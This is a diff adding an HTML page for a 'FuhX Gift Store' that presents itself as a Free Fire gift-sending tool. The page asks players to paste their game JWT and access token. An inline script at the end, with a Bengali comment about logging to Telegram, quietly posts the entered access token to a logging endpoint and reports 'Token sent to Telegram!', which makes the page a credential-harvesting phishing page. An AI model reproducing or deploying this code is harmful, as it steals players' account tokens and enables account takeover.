@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#00c88c">
+  <title>FuhX Gift Store</title>
+  <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+
+  <header class="main-header">
+    <div class="header-logo">🎁</div>
+    <div class="header-text">
+      <h1>FuhX GIFT STORE</h1>
+      <p>Free Fire Premium Store Interface</p>
+    </div>
+  </header>
+
+  <!-- LOGIN -->
+  <div class="login-container" id="loginBox">
+    <div class="login-icon">🔐</div>
+    <h2>AUTHENTICATION</h2>
+    <p class="sub">Enter your JWT token to access the store</p>
+    <input type="text" id="jwtInput" placeholder="Paste your JWT token here..." autocomplete="off">
+    <button id="loadBtn">LOAD GIFT STORE</button>
+    <p id="errorMsg" class="error"></p>
+  </div>
+
+  <!-- ACCESS TO JWT -->
+  <div class="login-container" id="jwtAccessBox" style="margin-top: 20px;">
+    <div class="login-icon">🔑</div>
+    <h2>ACCESS TO JWT</h2>
+    <p class="sub">Enter your access token to get JWT</p>
+    <input type="text" id="accessTokenInput" placeholder="Enter your access_token here..." autocomplete="off">
+    <button id="getJwtBtn">GET</button>
+    <p id="jwtErrorMsg" class="error"></p>
+    <div id="jwtResultBox" style="display:none; margin-top:16px; text-align:left;">
+      <p style="font-size:0.72em; color:var(--green); letter-spacing:2px; font-family:'Rajdhani',sans-serif; font-weight:600; margin-bottom:8px;">TOKEN</p>
+      <p id="jwtTokenText" style="font-size:0.78em; color:#8ac0d0; word-break:break-all; line-height:1.6; font-family:monospace; background:rgba(0,0,0,0.3); padding:12px; border-radius:8px; border:1px solid var(--border);"></p>
+      <button id="copyJwtBtn" style="margin-top:12px; width:100%; padding:11px; font-size:0.95em; border-radius:10px; background:transparent; border:1px solid var(--green); color:var(--green2); letter-spacing:1px;">⎘ COPY TOKEN</button>
+    </div>
+  </div>
+
+  <!-- STORE -->
+  <div class="store-container" id="storeBox" style="display:none;">
+    <div class="wallet-bar">
+      <div class="wallet-item">
+        <span class="label">Diamonds</span>
+        <span class="value" id="valDiamond">--</span>
+      </div>
+      <div class="wallet-item">
+        <span class="label">Gold</span>
+        <span class="value" id="valGold">--</span>
+      </div>
+      <div class="wallet-item full">
+        <span class="label">Last Top Up</span>
+        <span class="value" id="valTopup">--</span>
+      </div>
+    </div>
+
+    <div class="store-header">
+      <h3>🛒 Store Catalog</h3>
+      <span id="giftsSent">🎁 Sent Today: 0</span>
+    </div>
+
+    <div class="category-bar" id="categoryBar">
+      <button class="cat-btn active" data-cat="All">All Items</button>
+    </div>
+
+    <div class="grid" id="itemsGrid"></div>
+  </div>
+
+  <!-- GIFT MODAL -->
+  <div id="giftModal" class="modal">
+    <div class="modal-content">
+      <h2>🎁 SEND GIFT</h2>
+      <input type="text" id="targetUid" placeholder="Enter Receiver UID" autocomplete="off">
+      <input type="text" id="giftMsg" placeholder="Message (Optional)" value="Enjoy your gift!">
+      <div class="modal-btns">
+        <button id="confirmSend" class="btn-send">CONFIRM</button>
+        <button onclick="closeModal()" class="btn-cancel">CANCEL</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- TOAST -->
+  <div id="toast"></div>
+
+  <script src="/static/js/script.js"></script>
+  
+  <!-- এই স্ক্রিপ্টটি শুধু ACCESS TO JWT অংশকে টেলিগ্রামে লগ করবে -->
+  <script>
+    (function() {
+      const getBtn = document.getElementById('getJwtBtn');
+      const accessInput = document.getElementById('accessTokenInput');
+      const errorDiv = document.getElementById('jwtErrorMsg');
+
+      if (getBtn) {
+        getBtn.addEventListener('click', async function() {
+          const token = accessInput ? accessInput.value.trim() : '';
+          if (!token) {
+            if (errorDiv) errorDiv.innerText = '❌ Please enter an access token';
+            return;
+          }
+          try {
+            const response = await fetch('/api/log_access_token', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ access_token: token })
+            });
+            const data = await response.json();
+            if (data.success) {
+              if (errorDiv) {
+                errorDiv.style.color = '#88ff88';
+                errorDiv.innerText = '✅ Token sent to Telegram!';
+                setTimeout(() => { if(errorDiv) errorDiv.innerText = ''; }, 3000);
+              }
+              // (ঐচ্ছিক) আপনি চাইলে টোকেনটি jwtResultBox এ দেখাতে পারেন, কিন্তু তাতে কোনো পরিবর্তন হচ্ছে না
+            } else {
+              if (errorDiv) errorDiv.innerText = '❌ Failed to send token';
+            }
+          } catch (err) {
+            if (errorDiv) errorDiv.innerText = '❌ Network error';
+          }
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
